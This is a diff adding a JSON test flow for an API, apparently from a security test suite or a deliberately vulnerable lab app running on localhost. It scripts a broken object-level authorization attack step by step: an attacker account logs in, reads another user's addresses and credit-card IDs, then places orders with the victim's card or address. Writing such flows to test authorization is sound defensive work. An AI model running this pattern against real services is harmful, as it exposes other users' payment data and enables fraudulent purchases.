@@ -1,0 +1,78 @@
+{
+  "id": "flow_bola_attacker_recon_then_uses_victim_details_for_own_order",
+  "name": "BOLA: Attacker Recon Victim Data, Then Uses Victim's Card/Address for Own Order",
+  "description": "Attacker (GraceWilson) logs in, views victim's (HenryMoore) addresses and cards, extracts IDs, then places orders for herself using the victim's card ID or address ID.",
+  "staticVars": {
+    "baseUrl": "http://localhost:8000",
+    "attackerUserId": "00000008-0000-0000-0000-000000000008",
+    "attackerUsername": "GraceWilson",
+    "attackerPassword": "GracePass7&",
+    "attackerOwnAddressId": "ad000008-0001-0000-0000-000000000001",
+    "attackerOwnCardId": "cc000008-0001-0000-0000-000000000001",
+    "victimUserIdForRecon": "00000009-0000-0000-0000-000000000009",
+    "sampleProductId": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
+  },
+  "steps": [
+    {
+      "id": "step_attacker_login_grace_recon_exploit",
+      "name": "Attacker (GraceWilson) Logs In",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/auth/login?username={{attackerUsername}}&password={{attackerPassword}}",
+      "onFailure": "stop",
+      "extract": {
+        "attacker_token": "body.access_token"
+      }
+    },
+    {
+      "id": "step_attacker_recon_victim_addresses",
+      "name": "Attacker Views Victim (HenryMoore) Addresses for Recon",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{victimUserIdForRecon}}/addresses",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop",
+      "extract": {
+        "victim_address_id_from_recon": "body[0].address_id"
+      }
+    },
+    {
+      "id": "step_attacker_recon_victim_credit_cards",
+      "name": "Attacker Views Victim (HenryMoore) Credit Cards for Recon",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/users/{{victimUserIdForRecon}}/credit-cards",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop",
+      "extract": {
+        "victim_card_id_from_recon": "body[0].card_id"
+      }
+    },
+    {
+      "id": "step_attacker_order_own_address_using_victim_card",
+      "name": "Attacker Order (Own Address, Using Reconned Victim's Card)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders?address_id={{attackerOwnAddressId}}&credit_card_id={{victim_card_id_from_recon}}&product_id_1={{sampleProductId}}&quantity_1=1",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop"
+    },
+    {
+      "id": "step_attacker_order_victim_address_using_own_card",
+      "name": "Attacker Order (Using Reconned Victim's Address, Own Card)",
+      "type": "request",
+      "method": "POST",
+      "url": "{{baseUrl}}/api/users/{{attackerUserId}}/orders?address_id={{victim_address_id_from_recon}}&credit_card_id={{attackerOwnCardId}}&product_id_1={{sampleProductId}}&quantity_1=2",
+      "headers": {
+        "Authorization": "Bearer {{attacker_token}}"
+      },
+      "onFailure": "stop"
+    }
+  ]
+}
